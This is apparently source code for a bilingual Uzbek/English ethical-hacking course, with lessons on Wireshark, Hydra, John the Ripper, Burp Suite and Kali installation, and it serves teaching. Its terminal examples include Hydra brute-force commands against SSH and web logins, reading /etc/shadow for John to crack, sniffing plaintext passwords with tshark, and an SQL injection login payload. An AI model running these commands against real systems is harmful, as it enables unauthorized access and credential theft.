    React.createElement(Quiz,{q:{uz:"Nikto haqida qaysi tavsif to'g'ri?",en:"Which description of Nikto is correct?"},opts:[{uz:"Yashirin parol buzuvchi",en:"A stealthy password cracker"},{uz:"Shovqinli veb-server zaiflik skaneri",en:"A noisy web server vulnerability scanner"},{uz:"Tarmoq snifferi",en:"A network sniffer"},{uz:"Ekspluatatsiya frameworki",en:"An exploitation framework"}],correct:1,exp:{uz:"Nikto veb-serverlardagi ma'lum zaifliklar va noto'g'ri konfiguratsiyalarni tekshiruvchi skaner; u shovqinli — himoya tizimlari oson aniqlaydi.",en:"Nikto scans web servers for known vulnerabilities and misconfigurations; it's noisy — defenses detect it easily."}}));
}
function LessonL20(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Wireshark nima?","What is Wireshark?")),
    React.createElement(P,null,t(lang,"Wireshark — tarmoqdan o'tayotgan paketlarni real vaqtda ushlab, batafsil, qatlam-qatlam ko'rsatuvchi eng mashhur tarmoq protokoli analizatori. U tarmoqni \"rentgen\" qilib ko'rsatadi: har bir paket ichida nima borligini (Ethernet, IP, TCP, HTTP...) ochib beradi. Muammolarni tuzatish, o'rganish va xavfsizlik tahlili uchun ishlatiladi.","Wireshark is the most popular network protocol analyzer, capturing packets crossing the network in real time and displaying them in detail, layer by layer. It gives an \"X-ray\" of the network: it reveals what's inside each packet (Ethernet, IP, TCP, HTTP...). Used for troubleshooting, learning and security analysis.")),
    React.createElement(H2,{num:"§2"},t(lang,"Ish jarayoni","Workflow")),
    React.createElement(FlowSteps,{title:{uz:"Wireshark bilan tahlil",en:"Analyzing with Wireshark"},steps:[
      {icon:"🎣",text:{uz:"Interfeysni tanlab paketlarni ushlash",en:"Pick an interface and capture packets"}},
      {icon:"🔍",text:{uz:"Ko'rsatish filtri bilan keraklisini ajratish",en:"Narrow down with a display filter"}},
      {icon:"🧵",text:{uz:"\"Follow TCP Stream\" bilan suhbatni ko'rish",en:"See a conversation with \"Follow TCP Stream\""}},
      {icon:"🔑",text:{uz:"Shifrlanmagan protokolda login/parol ko'rinishi mumkin",en:"On unencrypted protocols, logins/passwords may appear"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Ikki xil filtr","Two kinds of filter")),
    React.createElement(P,null,t(lang,"Wireshark'da ikki xil filtr bor va ularni chalkashtirmaslik muhim. Ushlash filtri (capture filter) — nimani YOZIB OLISHNI cheklaydi (masalan faqat 80-port trafigi); u ushlash boshlanishidan oldin qo'yiladi va katta trafikda foydali. Ko'rsatish filtri (display filter) — allaqachon yozilganidan nimani KO'RSATISHNI cheklaydi; u ancha kuchli va moslashuvchan, chunki bir marta ushlab, keyin turli filtrlar bilan tahlil qilasiz. Ko'pincha display filter ishlatiladi.","Wireshark has two kinds of filter, and it's important not to confuse them. A capture filter limits what gets RECORDED (e.g. only port-80 traffic); it's set before the capture starts and is useful on heavy traffic. A display filter limits what is SHOWN from what was already recorded; it's far more powerful and flexible, because you capture once and then analyze with different filters. The display filter is used most often.")),
    React.createElement(H2,{num:"§4"},t(lang,"Follow Stream va tshark","Follow Stream and tshark")),
    React.createElement(P,null,t(lang,"Paketga o'ng tugma bosib \"Follow > TCP Stream\" ni tanlaganingizda, bitta ulanishning butun suhbatini bir oynada ko'rasiz — alohida paketlarni yig'ib o'tirmaysiz. Shifrlanmagan protokollarda (HTTP, FTP, Telnet) bu login va parollarni ochib berishi mumkin — aynan shuning uchun shifrlash (HTTPS) muhim. tshark esa Wireshark'ning terminal versiyasi — skriptlar va masofaviy serverlar uchun qulay.","When you right-click a packet and choose \"Follow > TCP Stream\", you see an entire conversation of one connection in a single window — no need to piece together individual packets. On unencrypted protocols (HTTP, FTP, Telnet) this can reveal logins and passwords — which is exactly why encryption (HTTPS) matters. tshark is the terminal version of Wireshark — handy for scripts and remote servers.")),
    React.createElement(Terminal,null,"# Keng tarqalgan ko'rsatish filtrlari:\nip.addr == 10.0.0.5\ntcp.port == 80\nhttp.request.method == \"POST\"\ndns\n# terminal versiyasi:\ntshark -i eth0 -f \"port 80\""),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Boshqalarning trafigini ruxsatsiz ushlash maxfiylikni buzadi va ko'p joyda qonunga zid. Faqat o'z tarmog'ingiz yoki ruxsat berilgan muhitda.","Capturing others' traffic without permission violates privacy and is illegal in many places. Only on your own network or an authorized environment.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: HTTP vs HTTPS Follow Stream","Interactive simulator: HTTP vs HTTPS Follow Stream")),
    React.createElement(P,null,t(lang,"Xuddi shu login jarayonini ikki protokolda ushlab, Follow Stream nima ko'rsatishini solishtiring:","Capture the exact same login two different ways and compare what Follow Stream reveals:")),
    React.createElement(ProtocolCaptureSim),
    React.createElement(H2,{num:"§6"},t(lang,"Foydali displey filtrlari","Useful display filters")),
    React.createElement(LayerStack,{layers:[{n:"http",name:t(lang,"http","http"),color:"#4dabf7",desc:{uz:"Faqat HTTP trafigini ko'rsatadi.",en:"Shows only HTTP traffic."}},{n:"ip.addr==",name:t(lang,"ip.addr==x","ip.addr==x"),color:"#69db7c",desc:{uz:"Berilgan IP bilan bog'liq paketlar.",en:"Packets involving a given IP."}},{n:"tcp.port==",name:t(lang,"tcp.port==x","tcp.port==x"),color:"#a855f7",desc:{uz:"Muayyan port trafigi.",en:"Traffic on a specific port."}},{n:"http.request",name:t(lang,"http.request","http.request"),color:"#ffd43b",desc:{uz:"Faqat HTTP so'rovlari (login, parol).",en:"Only HTTP requests (logins, passwords)."}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: parolni ko'rish","Practice: spotting a password")),
    React.createElement(P,null,t(lang,"Shifrlanmagan protokollarda (HTTP, FTP, Telnet) login va parol ochiq matnda uzatiladi, xuddi simulyatordagi «HTTP» ssenariysidek. Displey filtri bilan aynan o'sha paketni topib, Follow Stream orqali butun suhbatni o'qish mumkin.","In unencrypted protocols (HTTP, FTP, Telnet) the login and password travel in plain text, just like the simulator's «HTTP» scenario. With a display filter you find that exact packet, and Follow Stream lets you read the whole conversation.")),
    React.createElement(Terminal,null,"# tshark — Wireshark'ning buyruq qatori versiyasi\ntshark -i eth0 -Y «http.request.method==POST» -T fields -e http.file_data\n# username=admin&password=SuperSecret123\n# → shifrlanmagan trafik xavfli!"),
    React.createElement(Quiz,{q:{uz:"Ushlangan paketlardan faqat keraklisini ko'rsatish uchun nima ishlatiladi?",en:"What shows only the relevant captured packets?"},opts:[{uz:"Display filter (ko'rsatish filtri)",en:"A display filter"},{uz:"Firewall qoidasi",en:"A firewall rule"},{uz:"DNS yozuvi",en:"A DNS record"},{uz:"VPN tunnel",en:"A VPN tunnel"}],correct:0,exp:{uz:"Ko'rsatish filtri (masalan http yoki ip.addr==...) allaqachon ushlangan minglab paketdan faqat keraklisini ajratib ko'rsatadi.",en:"A display filter (e.g. http or ip.addr==...) narrows the thousands of already-captured packets to just the ones you need."}}));
}
function LessonL24(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Hydra nima?","What is Hydra?")),
    React.createElement(P,null,t(lang,"Hydra (THC-Hydra) — tezkor va parallel ishlaydigan onlayn parol buzish vositasi. U SSH, FTP, RDP, HTTP forma, SMB va o'nlab boshqa protokollarga qarshi lug'at (dictionary) hujumini amalga oshiradi. \"Onlayn\" degani — u to'g'ridan-to'g'ri jonli xizmatga urinadi (oflayn hash buzishdan farqli, L25). Parallel — bir vaqtda ko'p urinish yuboradi, shuning uchun tez.","Hydra (THC-Hydra) is a fast, parallelized online password-cracking tool. It performs dictionary attacks against SSH, FTP, RDP, HTTP forms, SMB and dozens of other protocols. \"Online\" means it attacks a live service directly (unlike offline hash cracking, L25). Parallel — it sends many attempts at once, so it's fast.")),
    React.createElement(H2,{num:"§2"},t(lang,"Brute-force oqimi","The brute-force flow")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Hydra hujumi",en:"Hydra attack"},steps:[
      {icon:"📃",text:{uz:"Foydalanuvchi va parol ro'yxatlari tayyorlanadi",en:"Username and password lists are prepared"}},
      {icon:"🔁",text:{uz:"Hydra har kombinatsiyani xizmatga urinib ko'radi",en:"Hydra tries each combination against the service"}},
      {icon:"✅",text:{uz:"To'g'ri juftlik topilsa — ko'rsatiladi",en:"When a valid pair is found — it's shown"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Sintaksis va parametrlar","Syntax and parameters")),
    React.createElement(P,null,t(lang,"Umumiy shakl: hydra -l USER -P WORDLIST target service. Kichik -l bitta foydalanuvchi, katta -L foydalanuvchilar faylini bildiradi; xuddi shunday -p bitta parol, -P parollar faylini. service — protokol (ssh, ftp, rdp). -t bilan parallel urinishlar sonini boshqarasiz (masalan -t 4). -V har urinishni ko'rsatadi (kuzatish uchun). Foydalanuvchi ro'yxatini ko'pincha enumeratsiya (L18) yoki OSINT (L15) dan olasiz.","General form: hydra -l USER -P WORDLIST target service. Lowercase -l is a single username, uppercase -L a users file; likewise -p a single password, -P a passwords file. service is the protocol (ssh, ftp, rdp). With -t you control the number of parallel attempts (e.g. -t 4). -V shows each attempt (for monitoring). The username list often comes from enumeration (L18) or OSINT (L15).")),
    React.createElement(H2,{num:"§4"},t(lang,"HTTP forma hujumi","HTTP form attack")),
    React.createElement(P,null,t(lang,"Veb login formalari uchun http-post-form moduli ishlatiladi — bu eng murakkab, lekin foydali qism. Sintaksis uch qismdan iborat, ikki nuqta bilan ajratilgan: (1) forma yo'li, (2) yuboriladigan ma'lumot ^USER^ va ^PASS^ o'rin egallovchilari bilan, (3) muvaffaqiyatsizlikni bildiruvchi matn (F=...). Hydra shu matnni ko'rsa — parol noto'g'ri deb biladi. Formani avval Burp Suite bilan tekshirib, aniq maydonlar nomini olish tavsiya etiladi.","For web login forms you use the http-post-form module — the trickiest but most useful part. The syntax has three parts, separated by colons: (1) the form path, (2) the data to send with ^USER^ and ^PASS^ placeholders, (3) the text indicating failure (F=...). When Hydra sees that text, it knows the password is wrong. It's recommended to first inspect the form with Burp Suite to get the exact field names.")),
    React.createElement(Terminal,null,"hydra -l admin -P rockyou.txt ssh://10.0.0.5\nhydra -L users.txt -P pass.txt -t 4 ftp://10.0.0.5\nhydra -l admin -P rockyou.txt 10.0.0.5 http-post-form \\\n  \"/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials\""),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Brute-force hujumlari faqat yozma ruxsat berilgan tizimlarda (CTF yoki shartnomali pentest) o'tkazilishi kerak. Ruxsatsiz urinish jinoyat hisoblanadi va akkauntlarni bloklashi mumkin.","Brute-force attacks must only be run on systems with written authorization (a CTF or contracted pentest). Unauthorized attempts are a crime and can lock out accounts.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: himoyasiz server vs fail2ban","Interactive simulator: unprotected server vs fail2ban")),
    React.createElement(P,null,t(lang,"§1 dagi «onlayn» so'zining haqiqiy ma'nosini his qiling — onlayn hujum sizga qarama-qarshi kuzatilib turishi mumkin. Xuddi shu Hydra hujumini ikki serverda sinang:","Feel what «online» in §1 really means — an online attack can be watched right back at you. Try the exact same Hydra attack against two servers:")),
    React.createElement(BruteForceDefenseSim),
    React.createElement(H2,{num:"§6"},t(lang,"Hydra parametrlari","Hydra parameters")),
    React.createElement(LayerStack,{layers:[{n:"-l / -L",name:t(lang,"-l / -L","-l / -L"),color:"#4dabf7",desc:{uz:"Bitta login (-l) yoki login ro'yxati (-L).",en:"One login (-l) or a login list (-L)."}},{n:"-p / -P",name:t(lang,"-p / -P","-p / -P"),color:"#69db7c",desc:{uz:"Bitta parol (-p) yoki parol ro'yxati (-P).",en:"One password (-p) or a password list (-P)."}},{n:"-t",name:t(lang,"-t","-t"),color:"#a855f7",desc:{uz:"Parallel oqimlar soni (tezlik/shovqin).",en:"Number of parallel threads (speed/noise)."}},{n:"modul",name:t(lang,"ssh/http-post-form","ssh/http-post-form"),color:"#ffd43b",desc:{uz:"Qaysi xizmat/protokol hujum qilinadi.",en:"Which service/protocol is attacked."}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: SSH brute-force","Practice: SSH brute-force")),
    React.createElement(P,null,t(lang,"Hydra onlayn (jonli xizmatga) parol sinaydi. http-post-form uchun forma maydonlari va xato xabari : bilan beriladi. Faqat ruxsat berilgan nishonlarda sinang.","Hydra tries passwords online (against a live service). For http-post-form you provide the form fields and the failure message separated by :. Only test on authorized targets.")),
    React.createElement(Terminal,null,"hydra -l admin -P rockyou.txt ssh://10.0.0.5 -t 4\n# [22][ssh] host: 10.0.0.5  login: admin  password: hunter2\n# 1 of 1 target successfully completed, 1 valid password found"),
    React.createElement(Quiz,{q:{uz:"Hydra qanday turdagi parol hujumini amalga oshiradi?",en:"What type of password attack does Hydra perform?"},opts:[{uz:"Oflayn hash buzish",en:"Offline hash cracking"},{uz:"Onlayn (jonli xizmatga) lug'at hujumi",en:"Online (against a live service) dictionary attack"},{uz:"Rainbow table",en:"Rainbow table"},{uz:"Phishing",en:"Phishing"}],correct:1,exp:{uz:"Hydra onlayn hujum vositasi — parollarni to'g'ridan-to'g'ri jonli xizmatga (SSH, FTP...) urinib sinaydi. Hashni oflayn buzish uchun John yoki Hashcat ishlatiladi.",en:"Hydra is an online attack tool — it tries passwords directly against a live service (SSH, FTP...). For offline hash cracking use John or Hashcat."}}));
}
function LessonL25(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"John the Ripper nima?","What is John the Ripper?")),
    React.createElement(P,null,t(lang,"John the Ripper (JtR) — mashhur oflayn parol hash buzish vositasi. \"Oflayn\" degani — u sizda allaqachon mavjud bo'lgan hashlar bilan ishlaydi va nishon tizimga umuman ulanmaydi (Hydra'dan asosiy farqi shu). Parollar hech qachon ochiq saqlanmaydi — ular hash (bir tomonlama shifrlangan) shaklida bo'ladi. John hashga mos keladigan parolni topguncha taxminlarni sinab ko'radi.","John the Ripper (JtR) is a popular offline password-hash cracker. \"Offline\" means it works on hashes you already have and never connects to the target system (the key difference from Hydra). Passwords are never stored in the clear — they exist as hashes (one-way encrypted). John tries guesses until it finds a password that matches the hash.")),
    React.createElement(H2,{num:"§2"},t(lang,"Buzish oqimi","The cracking flow")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"John bilan buzish",en:"Cracking with John"},steps:[
      {icon:"🔗",text:{uz:"unshadow bilan passwd+shadow ni birlashtirish",en:"Combine passwd+shadow with unshadow"}},
      {icon:"📖",text:{uz:"Lug'at rejimida buzish (rockyou.txt)",en:"Crack in wordlist mode (rockyou.txt)"}},
      {icon:"🧠",text:{uz:"Qoidalar bilan parollarni o'zgartirish (--rules)",en:"Mutate passwords with rules (--rules)"}},
      {icon:"👁",text:{uz:"--show bilan buzilgan parollarni ko'rish",en:"View cracked passwords with --show"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"unshadow va hash formatlari","unshadow and hash formats")),
    React.createElement(P,null,t(lang,"Linux'da parol hashlari /etc/shadow da, foydalanuvchi ma'lumotlari esa /etc/passwd da saqlanadi. John ularni birga ko'rishi kerak — shuning uchun unshadow buyrug'i ikkalasini bitta faylga birlashtiradi. John yuzlab hash turini qo'llab-quvvatlaydi (MD5, SHA-512, NTLM, bcrypt) va ko'pincha turini avtomatik aniqlaydi. Agar aniqlay olmasa, --format=raw-md5 kabi qo'lda ko'rsatasiz.","On Linux, password hashes are in /etc/shadow and user info in /etc/passwd. John needs to see them together — so the unshadow command combines both into one file. John supports hundreds of hash types (MD5, SHA-512, NTLM, bcrypt) and usually auto-detects the type. If it can't, you specify it manually like --format=raw-md5.")),
    React.createElement(H2,{num:"§4"},t(lang,"Rejimlar va qoidalar","Modes and rules")),
    React.createElement(P,null,t(lang,"John uch asosiy rejimda ishlaydi. Wordlist (lug'at) — fayldagi har so'zni sinaydi (tez, eng ko'p ishlatiladi). Incremental — barcha belgilar kombinatsiyasini sinaydi (brute-force, sekin, lekin har narsani topadi). Single crack — foydalanuvchi ma'lumotidan parol taxmin qiladi. Eng kuchli usul — --rules: u lug'atdagi so'zlarni o'zgartiradi (password → P@ssw0rd, Password123) — chunki odamlar aynan shunday \"murakkablashtiradi\". Buzilgan parollar potfile ga saqlanadi va --show bilan ko'riladi.","John works in three main modes. Wordlist — tries each word in a file (fast, most used). Incremental — tries all character combinations (brute-force, slow, but finds anything). Single crack — guesses passwords from user info. The most powerful technique is --rules: it mutates wordlist words (password → P@ssw0rd, Password123) — because that's exactly how people \"complicate\" them. Cracked passwords are saved to the potfile and viewed with --show.")),
    React.createElement(Terminal,null,"unshadow /etc/passwd /etc/shadow > hashes.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --wordlist=rockyou.txt --rules hashes.txt   # qoidalar bilan\njohn --format=raw-md5 md5.txt\njohn --show hashes.txt                            # buzilganlarni ko'rish"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"John CPU'da moslashuvchan va hash turini avtomatik aniqlaydi; Hashcat esa GPU tezligida ancha tez ishlaydi. Katta hajmdagi ishlar uchun Hashcat afzal (L26).","John is flexible on the CPU and auto-detects the hash type; Hashcat runs much faster at GPU speed. For large jobs Hashcat is preferred (L26).")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: qoidasiz vs --rules bilan","Interactive simulator: without rules vs with --rules")),
    React.createElement(P,null,t(lang,"§4 dagi eng kuchli usulni his qiling — xuddi shu «Password123!» hashini ikki usulda sinang:","Feel the most powerful technique from §4 for yourself — try cracking the same «Password123!» hash two ways:")),
    React.createElement(RulesMutationSim),
    React.createElement(H2,{num:"§6"},t(lang,"John rejimlari","John's modes")),
    React.createElement(LayerStack,{layers:[{n:"single",name:t(lang,"single","single"),color:"#4dabf7",desc:{uz:"Foydalanuvchi nomidan variantlar yasaydi.",en:"Builds guesses from the username."}},{n:"wordlist",name:t(lang,"wordlist","wordlist"),color:"#69db7c",desc:{uz:"Lug'at + qoidalar (--rules) bilan.",en:"Dictionary + rules (--rules)."}},{n:"incremental",name:t(lang,"incremental","incremental"),color:"#ff3a5e",desc:{uz:"Brute-force — barcha kombinatsiyalar.",en:"Brute-force — all combinations."}},{n:"--show",name:t(lang,"--show","--show"),color:"#ffd43b",desc:{uz:"Buzilgan parollarni ko'rsatadi.",en:"Shows the cracked passwords."}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: hashni buzish","Practice: cracking a hash")),
    React.createElement(P,null,t(lang,"John hash turini avtomatik aniqlaydi. Avval unshadow bilan fayl tayyorlanadi, so'ng lug'at hujumi ishga tushiriladi. Natija --show bilan ko'riladi.","John auto-detects the hash type. First unshadow prepares the file, then a dictionary attack runs. The result is viewed with --show.")),
    React.createElement(Terminal,null,"john --wordlist=rockyou.txt passwords.txt\n# Loaded 2 password hashes (sha512crypt)\n# hunter2          (alice)\n# Password123      (bob)\njohn --show passwords.txt   # buzilganlarni qayta ko'rish"),
    React.createElement(Quiz,{q:{uz:"John \"oflayn\" vosita deganda nima nazarda tutiladi?",en:"What does it mean that John is an \"offline\" tool?"},opts:[{uz:"Internet talab qilmaydi",en:"It needs no internet"},{uz:"Nishonga ulanmasdan mavjud hashlarni buzadi",en:"It cracks existing hashes without touching the target"},{uz:"Faqat kechasi ishlaydi",en:"It only runs at night"},{uz:"Faqat Windows'da",en:"Windows only"}],correct:1,exp:{uz:"Oflayn buzish — qo'lga kiritilgan hashlarni mahalliy ravishda, nishon xizmatiga hech qanday so'rov yubormasdan sindirish.",en:"Offline cracking means breaking captured hashes locally, sending no requests to the target service."}}));
}
function LessonL27(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Burp Suite nima?","What is Burp Suite?")),
    React.createElement(P,null,t(lang,"Burp Suite — veb-ilovalarni xavfsizlik nuqtai nazaridan test qilishning sanoat standarti. Har qanday veb-sayt bilan ishlaganingizda brauzeringiz serverga HTTP so'rovlar yuboradi va javob oladi. Odatda bu jarayon ko'rinmaydi. Burp esa brauzer va server o'rtasida \"proksi\" (vositachi) bo'lib turadi: har bir so'rovni ushlab, siz uni ko'rishingiz, o'zgartirishingiz va qayta yuborishingiz mumkin. Bu — veb-hujumlarni tushunish va topishning kalitidir.","Burp Suite is the industry standard for security-testing web applications. Whenever you use a website, your browser sends HTTP requests to the server and gets responses. Normally this is invisible. Burp sits as a \"proxy\" (middleman) between browser and server: it intercepts every request so you can see it, modify it and resend it. This is the key to understanding and finding web attacks.")),
    React.createElement(H2,{num:"§2"},t(lang,"Proksi qanday ishlaydi","How the proxy works")),
    React.createElement(P,null,t(lang,"Brauzeringizni Burp'ning proksisiga (127.0.0.1:8080) yo'naltirasiz. Endi barcha trafik avval Burp'dan o'tadi. HTTPS trafikni ham ko'rish uchun Burp'ning CA sertifikatini brauzerga o'rnatasiz — aks holda shifrlangan so'rovlar o'qib bo'lmaydi. Sertifikat o'rnatilgach, Burp shifrni ochib, so'rovni ko'rsatadi va yana shifrlab serverga uzatadi. Bu \"man-in-the-middle\" tamoyili, lekin bu yerda siz o'z brauzeringizni test qilyapsiz.","You point your browser at Burp's proxy (127.0.0.1:8080). Now all traffic passes through Burp first. To see HTTPS traffic too, you install Burp's CA certificate in the browser — otherwise encrypted requests are unreadable. Once installed, Burp decrypts the request, shows it to you, then re-encrypts it and forwards it to the server. This is the \"man-in-the-middle\" principle, except here you are testing your own browser.")),
    React.createElement(H2,{num:"§3"},t(lang,"Asosiy komponentlar","Core components")),
    React.createElement(LayerStack,{layers:[
      {n:"Proxy",name:t(lang,"Ushlash","Intercept"),color:"#a855f7",desc:{uz:"So'rovlarni ushlab, o'zgartirish.",en:"Intercept and modify requests."}},
      {n:"Repeater",name:t(lang,"Qayta yuborish","Replay"),color:"#4dabf7",desc:{uz:"Bitta so'rovni qo'lda o'zgartirib qayta yuborish.",en:"Manually tweak and resend one request."}},
      {n:"Intruder",name:t(lang,"Fuzzing/brute","Fuzzing/brute"),color:"#ff3a5e",desc:{uz:"Avtomatik payload hujumlari.",en:"Automated payload attacks."}},
      {n:"Decoder",name:t(lang,"Kodlash","Encode"),color:"#69db7c",desc:{uz:"base64, URL kodlash/dekodlash.",en:"base64, URL encode/decode."}},
    ]}),
    React.createElement(H2,{num:"§4"},t(lang,"Proksi bilan test oqimi","Testing with the proxy")),
    React.createElement(FlowSteps,{color:"#a855f7",title:{uz:"Burp bilan so'rovni test qilish",en:"Testing a request with Burp"},steps:[
      {icon:"🔌",text:{uz:"Brauzer proksisini 127.0.0.1:8080 ga sozlash",en:"Set the browser proxy to 127.0.0.1:8080"}},
      {icon:"✋",text:{uz:"So'rovni ushlash (Intercept ON)",en:"Intercept a request (Intercept ON)"}},
      {icon:"➡",text:{uz:"Repeater'ga yuborish (Ctrl+R)",en:"Send to Repeater (Ctrl+R)"}},
      {icon:"🧪",text:{uz:"Payloadlarni o'zgartirib javobni tahlil qilish",en:"Modify payloads and analyze the response"}},
    ]}),
    React.createElement(H2,{num:"§5"},t(lang,"Intruder hujum turlari","Intruder attack types")),
    React.createElement(P,null,t(lang,"Intruder so'rovning bir yoki bir necha joyiga avtomatik ravishda ko'plab qiymat qo'yib sinaydi — parol brute-force, foydalanuvchi nomlarini sanash yoki parametr fuzzing uchun. To'rt turi bor: Sniper — bitta payload ro'yxatini har bir belgilangan joyga navbat bilan qo'yadi; Battering ram — bir xil payloadni barcha joylarga bir vaqtda; Pitchfork — har joyga alohida ro'yxat (parallel); Cluster bomb — barcha ro'yxatlarning har bir kombinatsiyasini sinaydi (login+parol juftliklari uchun ideal).","Intruder automatically inserts many values into one or more spots in a request — for password brute-force, username enumeration or parameter fuzzing. There are four types: Sniper puts one payload list into each marked spot in turn; Battering ram puts the same payload into all spots at once; Pitchfork uses a separate list per spot (parallel); Cluster bomb tries every combination of all lists (ideal for login+password pairs).")),
    React.createElement(Terminal,null,"# Burp'ni ishga tushirish\nburpsuite &\n\n# Repeater'da qo'l bilan yuboriladigan so'rov namunasi:\nPOST /login HTTP/1.1\nHost: target.local\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=test123"),
    React.createElement(H2,{num:"§6"},t(lang,"Interaktiv simulyator: Sniper vs Cluster bomb","Interactive simulator: Sniper vs Cluster bomb")),
    React.createElement(P,null,t(lang,"Eng ko'p chalkashtiriladigan ikki rejimni his qiling — ikkala maydonli login formasini ikkalasi bilan sinang:","Feel the two most commonly confused modes — attack the same two-field login form with each:")),
    React.createElement(IntruderModeSim),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Bepul Community versiyasida Repeater va Proxy to'liq ishlaydi, lekin Intruder sekinlashtirilgan. Mashq uchun PortSwigger Web Security Academy (portswigger.net/web-security) bepul, qonuniy laboratoriyalar beradi.","In the free Community edition Repeater and Proxy work fully, but Intruder is throttled. For practice, PortSwigger Web Security Academy (portswigger.net/web-security) offers free, legal labs.")),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Burp ni faqat sizga tegishli yoki yozma ruxsat berilgan veb-ilovalarda ishlating.","Only use Burp on web apps you own or have written authorization to test.")),
    React.createElement(H2,{num:"§7"},t(lang,"Community va Professional","Community vs Professional")),
    React.createElement(CompareCols,{left:{title:{uz:"Community (bepul)",en:"Community (free)"},color:"#69db7c",rows:[{uz:"Proxy va Repeater to'liq",en:"Full Proxy and Repeater"},{uz:"Intruder sekinlashtirilgan",en:"Intruder is throttled"},{uz:"O'rganish uchun yetarli",en:"Enough for learning"},]},right:{title:{uz:"Professional",en:"Professional"},color:"#ff3a5e",rows:[{uz:"Avtomatik skaner (Scanner)",en:"Automated Scanner"},{uz:"Tez Intruder",en:"Fast Intruder"},{uz:"Professional pentest uchun",en:"For professional pentests"},]}}),
    React.createElement(H2,{num:"§8"},t(lang,"Amaliyot: so'rovni ushlash","Practice: intercepting a request")),
    React.createElement(P,null,t(lang,"Proxy so'rovni ushlaydi, siz uni Repeater'ga yuborib qo'lda o'zgartirasiz. Quyida login so'rovi — password maydonini o'zgartirib, javobni tahlil qilish mumkin.","The Proxy intercepts a request, you send it to Repeater and modify it by hand. Below is a login request — you can tweak the password field and analyze the response.")),
    React.createElement(Terminal,null,"POST /login HTTP/1.1\nHost: 10.0.0.5\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=test' OR '1'='1\n# → javobda SQL xatosi = SQL Injection ehtimoli"),
    React.createElement(Quiz,{q:{uz:"Burp'ning qaysi qismi bitta so'rovni qo'lda o'zgartirib qayta yuborishga mo'ljallangan?",en:"Which Burp part is for manually tweaking and resending one request?"},opts:[{uz:"Proxy",en:"Proxy"},{uz:"Repeater",en:"Repeater"},{uz:"Decoder",en:"Decoder"},{uz:"Comparer",en:"Comparer"}],correct:1,exp:{uz:"Repeater bitta so'rovni qo'lda o'zgartirib, qayta yuborish va javoblarni solishtirish uchun ishlatiladi.",en:"Repeater is used to manually tweak a single request, resend it and compare responses."}}));
}
function LessonL02(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Kali'ni o'rnatish usullari","Ways to install Kali")),
    React.createElement(P,null,t(lang,"Kali'ni o'rnatishning bir necha yo'li bor va to'g'ri tanlov sizning maqsadingizga bog'liq. Yangi boshlovchilar uchun virtual mashina eng xavfsiz tanlov — xatolar asosiy tizimingizga tegmaydi va snapshot (tizimning \"suratini olish\") orqali istalgan holatga bir soniyada qaytish mumkin.","There are several ways to install Kali, and the right choice depends on your goal. For beginners, a virtual machine is the safest — mistakes never touch your host OS, and a snapshot (a \"photo\" of the system state) lets you revert to any state in a second.")),
    React.createElement(LayerStack,{layers:[
      {n:"💻",name:t(lang,"Virtual mashina (tavsiya)","Virtual machine (recommended)"),color:"#69db7c",desc:{uz:"VirtualBox/VMware ichida — izolyatsiya, snapshot, asosiy tizim xavfsiz.",en:"Inside VirtualBox/VMware — isolation, snapshots, host stays safe."}},
      {n:"🖥",name:t(lang,"Bare metal","Bare metal"),color:"#4dabf7",desc:{uz:"To'g'ridan-to'g'ri diskka — to'liq unumdorlik, apparatga to'liq kirish.",en:"Directly to disk — full performance, full hardware access."}},
      {n:"🔌",name:"Live USB",color:"#a855f7",desc:{uz:"USB'dan o'rnatmasdan ishga tushirish — iz qoldirmaydi, forensika uchun.",en:"Boot from USB without installing — leaves no trace, good for forensics."}},
      {n:"🪟",name:"WSL",color:"#ffd43b",desc:{uz:"Windows ichida (GUI'siz) — tez, buyruq qatori vositalari uchun.",en:"Inside Windows (no GUI) — fast, for command-line tools."}},
    ]}),
    React.createElement(H2,{num:"§2"},t(lang,"O'rnatish oqimi","The install flow")),
    React.createElement(P,null,t(lang,"Xavfsiz o'rnatish bir necha bosqichdan iborat. \"Ishga tushir\" ni bosib har qadamni kuzating:","A safe install has a few stages. Press \"Play\" to watch each step:")),
    React.createElement(FlowSteps,{title:{uz:"Kali o'rnatish",en:"Installing Kali"},steps:[
      {icon:"⬇",text:{uz:"kali.org/get-kali dan ISO ni yuklab olish",en:"Download the ISO from kali.org/get-kali"}},
      {icon:"🔑",text:{uz:"SHA256 summasini tekshirish (buzilmagan/almashtirilmaganini)",en:"Verify the SHA256 checksum (not corrupted/tampered)"}},
      {icon:"💻",text:{uz:"VirtualBox'da yangi VM yaratib ISO'dan o'rnatish",en:"Create a new VM in VirtualBox and install from the ISO"}},
